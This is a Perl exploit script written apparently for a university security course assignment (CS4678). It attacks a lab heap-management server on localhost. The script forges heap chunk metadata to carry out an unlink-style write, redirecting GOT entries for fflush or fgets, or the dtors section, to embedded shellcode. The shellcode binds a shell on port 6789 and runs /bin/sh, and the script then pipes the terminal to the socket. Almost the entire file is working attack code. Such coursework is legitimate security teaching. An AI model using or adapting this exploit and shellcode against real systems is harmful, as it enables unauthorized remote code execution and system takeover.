#!/usr/bin/perl
#--------------------------------------------
# Name: 
# Class: CS4678
# Assignment 6
# File: exploit.pl
# Last modified: 23 Feb 2012
#--------------------------------------------
#

# first heap buffer @ 0x0804be70  (  +8 = 0x0804be78)
# alternate buffers @ 0x0804bf78, 0x0804c080, 0x0804c188 ...
# execute_this      @ 0x08048aaf  (  +8 = 0x08048ab7)

# fprintf pointer   @ 0x0804a4c4  ( -12 = 0x0804a4b8)
# fflush pointer    @ 0x0804a4d0  ( -12 = 0x0804a4c4)
# fgets pointer     @ 0x0804a4f0  ( -12 = 0x0804a4e4)
# strcmp pointer    @ 0x0804a4b8  ( -12 = 0x0804a4ac)
# gets pointer      @ 0x0804a4d4  ( -12 = 0x0804a4c8)
# malloc pointer    @ 0x0804a4e0  ( -12 = 0x0804a4d0)
# sscanf pointer    @ 0x0804a514  ( -12 = 0x0804a508)
# free pointer      @ 0x0804a518  ( -12 = 0x0804a50c)
# dtors section     @ 0x8048a49c  ( -12 = 0x0804a490)

$buffer       = "\x78\xbe\x04\x08";
$pointer      = "\xb8\xa4\x04\x08";
$fflush_ptr   = "\xc4\xa4\x04\x08";
$fgets_ptr    = "\xe4\xa4\x04\x08";
$dtors_ptr    = "\x90\xa4\x04\x08";
$execute_this = "\xb7\x8a\x04\x08";


# bindsckcode.asm  - from class resources
# bindsckcode  73 bytes payload, 24 bytes spawn shell = 133 bytes padding
#    server on port 6789  (\x1A  \x85)
$shellcode = 
	"\x31\xC0\x50\x68\x02\x00\x1A\x85\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB0\x66" .
	"\x43\xCD\x80\xB0\x66\xB3\x04\x89\x44\x24\x04\xCD\x80\x31\xC0\x83" .
	"\xC4\x0C\x50\x50\xB0\x66\x43\xCD\x80\x89\xC3\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6" .
# lsod_shellcode.asm  - from class resources
	"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89" .
   	"\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80";

use Getopt::Long;
my $fflushExploit = '';	# option variable with default value (false)
my $fgetsExploit  = '';	# option variable with default value (false)
my $dtorsExploit  = '';	# option variable with default value (false)
my $executeThis   = '';	# option variable with default value (false)
GetOptions ('fflush'  => \$fflushExploit, 
            'fgets'   => \$fgetsExploit,
            'dtors'   => \$dtorsExploit,
            'execute' => \$executeThis ); 

if ($fflushExploit) {
	$pointer = $fflush_ptr;
} elsif ($fgetsExploit) {
	$pointer = $fgets_ptr;
} elsif ($dtorsExploit) {
	$pointer = $dtors_ptr;
} elsif ($executeThis) {
#  0:	b8 af 8a 04 08       	mov    eax,0x8048aaf
#  5:	ff e0                	jmp    eax
	$shellcode = "\xb8\xaf\x8a\x04\x08\xff\xe0";
}

use IO::Socket; 
my $sock = new IO::Socket::INET ( 
	PeerAddr => '127.0.0.1', 
	PeerPort => '4444', 
	Proto => 'tcp', 
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

# read data from server
$data = <$sock>;
print "$data";
print "\t *** CONTINUE? ";
$data = <>;
# send exploit
print "\t *** Sending exploit to server\n";
for (1..3) {
	print $sock "add\n";
	print $sock "A"x8 . "\xeb\x10" . "A"x16 . $shellcode . "\n";
	$data = <$sock>;
	print "$data";
}

print $sock "replace 1\n";
print $sock "A"x240; 
print $sock "PPPP";             # prev_size (fake)
print $sock "\xf0\xff\xff\xff"; # size      (fake)
print $sock "B"x8;              # fd & bk   (fake)
print $sock "PPPP";             # prev_size
print $sock "\xf0\xff\xff\xff"; # size (-16)
print $sock $pointer;           # fd (target address -12)
print $sock $buffer;            # bk ($shellcode + 8)
print $sock "\n";
$data = <$sock>;
print "$data";
print $sock "delete 1\n";

#read data from server

# split the program into two processes, identical twins
die "can't fork: $!" unless defined($kidpid = fork());

# the if{} block runs only in the parent process
if ($kidpid) {
	# copy the socket to standard output
	while (defined ($line = <$sock>)) {
	    print STDOUT $line;
	}
	kill("TERM", $kidpid);                  # send SIGTERM to child
}
# the else{} block runs only in the child process
else {
	# copy standard input to the socket
	while (defined ($line = <STDIN>)) {
	    print $sock $line;
	}
}

close($sock);

